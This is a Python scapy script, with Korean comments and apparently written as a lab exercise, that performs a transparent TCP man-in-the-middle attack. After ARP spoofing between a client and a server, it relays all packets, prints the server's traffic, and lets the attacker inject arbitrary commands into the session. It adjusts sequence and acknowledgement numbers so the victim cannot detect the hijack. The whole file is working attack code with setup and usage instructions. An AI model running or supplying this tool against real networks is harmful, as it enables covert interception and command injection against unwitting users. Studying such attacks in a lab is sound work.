#!/usr/bin/python3
"""Step 2 - 투명 TCP MITM.

요구사항:
 - victim(client) 도 정상 송수신을 유지 (하이재킹 인식 불가)
 - 공격자가 임의의 시점에 server 에 메세지 inject 가능
 - 서버 메세지는 (1) 공격자 화면에 출력 (2) client 로도 정상 전달
 - 서버 FIN 발생 시 client 까지 정상 종료

원리:
 - h3 가 h1↔h2 양방향 ARP 스푸핑으로 모든 트래픽을 가로채고 있음
 - h3 의 ip_forward=0 → 커널 자동 포워딩 없음. scapy 가 모든 패킷을 relay.
 - 공격자가 inject 한 만큼 server 가 받은 누적 바이트 수가 client 가 보낸 것보다 많다.
   => "cli_offset" 변수를 두어:
        client→server 패킷의 seq에 +cli_offset
        server→client 패킷의 ack에 -cli_offset 로 보정.

사전 조건:
    h3# sysctl -w net.ipv4.ip_forward=0
    h3# python3 arpspoof.py 10.0.0.1 10.0.0.2 &

사용법:
    python3 hijack_step2.py -s 10.0.0.2 -c 10.0.0.1 -p 1001 [-i h3-eth0]
"""
import sys
import getopt
import threading
from scapy.all import sniff, send, IP, TCP, Raw

dev = "h3-eth0"
srv_ip = None
srv_port = None
cli_ip = None

st = {
    "lock": threading.Lock(),
    "cli_port": None,        # 클라이언트 포트 (관찰해서 학습)
    "cli_offset": 0,         # 공격자가 server에 inject 한 누적 바이트
    "next_cli_seq": None,    # client 가 다음 보낼 seq (client view)
    "next_srv_seq": None,    # server 가 다음 보낼 seq
    "established": False,
    "closing": False,
}


def _segment_len(tcp_layer, payload):
    n = len(payload)
    f = tcp_layer.flags
    if f & 0x02:  # SYN
        n += 1
    if f & 0x01:  # FIN
        n += 1
    return n


def _rebuild(ip_pkt):
    """체크섬 재계산을 위해 chksum 필드 제거."""
    del ip_pkt.chksum
    del ip_pkt[TCP].chksum
    if ip_pkt.haslayer(Raw):
        ip_pkt[TCP].remove_payload()
        ip_pkt[TCP] / Raw(load=bytes(ip_pkt[Raw].load))  # not used; we rebuild externally
    return ip_pkt


def forward_client_to_server(pkt):
    ip, tcp = pkt[IP], pkt[TCP]
    payload = bytes(pkt[Raw].load) if pkt.haslayer(Raw) else b""
    new_seq = (tcp.seq + st["cli_offset"]) & 0xFFFFFFFF
    new_tcp = TCP(
        sport=tcp.sport, dport=tcp.dport,
        seq=new_seq, ack=tcp.ack,
        flags=tcp.flags, window=tcp.window,
        options=tcp.options,
    )
    fwd = IP(src=ip.src, dst=ip.dst) / new_tcp
    if payload:
        fwd = fwd / Raw(load=payload)
    send(fwd, iface=dev, verbose=False)

    # client 시점 next seq 갱신
    seg = _segment_len(tcp, payload)
    if seg:
        nxt = (tcp.seq + seg) & 0xFFFFFFFF
        if st["next_cli_seq"] is None or _gt(nxt, st["next_cli_seq"]):
            st["next_cli_seq"] = nxt


def forward_server_to_client(pkt):
    ip, tcp = pkt[IP], pkt[TCP]
    payload = bytes(pkt[Raw].load) if pkt.haslayer(Raw) else b""
    new_ack = (tcp.ack - st["cli_offset"]) & 0xFFFFFFFF
    new_tcp = TCP(
        sport=tcp.sport, dport=tcp.dport,
        seq=tcp.seq, ack=new_ack,
        flags=tcp.flags, window=tcp.window,
        options=tcp.options,
    )
    fwd = IP(src=ip.src, dst=ip.dst) / new_tcp
    if payload:
        fwd = fwd / Raw(load=payload)
    send(fwd, iface=dev, verbose=False)

    if payload:
        sys.stdout.write(f"\n[server→client] {payload.decode(errors='replace')}")
        sys.stdout.flush()

    seg = _segment_len(tcp, payload)
    if seg:
        nxt = (tcp.seq + seg) & 0xFFFFFFFF
        if st["next_srv_seq"] is None or _gt(nxt, st["next_srv_seq"]):
            st["next_srv_seq"] = nxt


def _gt(a, b):
    """TCP seq 비교 (modular)."""
    return ((a - b) & 0xFFFFFFFF) < 0x80000000 and a != b


def handle(pkt):
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP)):
        return
    ip, tcp = pkt[IP], pkt[TCP]

    is_c2s = (ip.src == cli_ip and ip.dst == srv_ip and tcp.dport == srv_port)
    is_s2c = (ip.src == srv_ip and ip.dst == cli_ip and tcp.sport == srv_port)
    if not (is_c2s or is_s2c):
        return

    with st["lock"]:
        if is_c2s and st["cli_port"] is None:
            st["cli_port"] = tcp.sport
            print(f"[+] learned client port: {tcp.sport}")
        # 우리가 만든 패킷이 다시 sniff 되는 경우 회피: src MAC 검사 등으로 가능하지만
        # send()는 iface 출력만 하고 자기 자신엔 수신되지 않으므로 일반적으로 안전.

        if is_c2s:
            forward_client_to_server(pkt)
        else:
            forward_server_to_client(pkt)

        # ESTABLISHED 표시 (대충 첫 데이터 또는 ACK 본 후)
        if not st["established"] and (tcp.flags & 0x10):
            st["established"] = True

        # 종료 흐름
        if tcp.flags & 0x01:  # FIN
            st["closing"] = True
        if tcp.flags & 0x04:  # RST
            st["closing"] = True


def injector():
    print("[+] attacker> 명령을 입력하면 server 로 inject 됩니다 (client 모르게).")
    while True:
        try:
            line = input("attacker> ")
        except (EOFError, KeyboardInterrupt):
            return
        if not line:
            continue
        payload = (line + "\n").encode()
        with st["lock"]:
            if st["next_cli_seq"] is None or st["next_srv_seq"] is None or st["cli_port"] is None:
                print("(아직 세션을 충분히 관찰하지 못함. 클라이언트가 먼저 한 줄 보내야 함)")
                continue
            seq = (st["next_cli_seq"] + st["cli_offset"]) & 0xFFFFFFFF
            ack = st["next_srv_seq"]
            pkt = (
                IP(src=cli_ip, dst=srv_ip)
                / TCP(sport=st["cli_port"], dport=srv_port,
                      flags="PA", seq=seq, ack=ack)
                / Raw(load=payload)
            )
            send(pkt, iface=dev, verbose=False)
            st["cli_offset"] = (st["cli_offset"] + len(payload)) & 0xFFFFFFFF
            print(f"[+] injected {len(payload)}B (cli_offset={st['cli_offset']})")


def usage():
    print(f"{sys.argv[0]} -s <srv_ip> -c <client_ip> -p <srv_port> [-i iface]")
    sys.exit(1)


try:
    opts, _ = getopt.getopt(sys.argv[1:], "s:c:p:i:")
except getopt.GetoptError:
    usage()
for k, v in opts:
    if k == "-s":
        srv_ip = v
    elif k == "-c":
        cli_ip = v
    elif k == "-p":
        srv_port = int(v)
    elif k == "-i":
        dev = v
if not (srv_ip and cli_ip and srv_port):
    usage()

threading.Thread(target=injector, daemon=True).start()
bpf = f"tcp and host {srv_ip} and host {cli_ip} and port {srv_port}"
print(f"[+] sniffing on {dev}  filter='{bpf}'")
sniff(iface=dev, store=0, filter=bpf, prn=handle)
